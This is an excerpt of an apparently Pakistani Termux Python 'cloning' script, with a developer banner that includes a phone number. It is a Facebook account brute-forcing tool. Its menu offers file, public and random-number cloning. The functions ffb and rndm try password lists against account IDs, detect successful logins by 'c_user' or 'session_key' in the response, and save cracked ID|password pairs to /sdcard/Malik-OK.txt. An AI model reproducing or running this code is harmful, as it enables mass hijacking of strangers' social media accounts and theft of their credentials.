...
╔══════════════════════════════════════╗
║        WELCOME TO AHMAD COMMANDZ     ║     
╚══════════════════════════════════════╝                                     
╔══════════════════════════════════════╗
║\033[1;97m[+] DEVOLPER   : M AHMAD MALIK        ║
║\033[1;97m[+] FACEBOOK   : AHMAD MALIK          ║
║\033[1;97m[+] WHATSAPP   : +923056673626        ║
║\033[1;97m[+] GITHUB     : AHMAD0176            ║
║\033[1;97m[+] VERTION    : 1.2                  ║
╚══════════════════════════════════════╝""")
def linex():
	print('----------------------------------------------')
def clear():
...
def public():
        ...
        for met in range(jum):
                ...
                usrr.append(kl)
        linex()
        print(' Best working methods are given Below ')
        linex()
...
def menu():
        ...
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' [1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random numbers cloning\n [5] Random Gmails cloning\n [6] WhatsApp Group join (soon available)\n [0] Exit menu')
                        linex()
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923056673626 I &text="
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Malik-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [Malik-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Malik-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [Malik-CP] '+ids+' | '+pas+'\x1b[1;93m')
...
def rndm(ids,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Malik-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Malik-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Malik-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Malik-OK] '+uid+' | '+pas+'\033[1;97m')
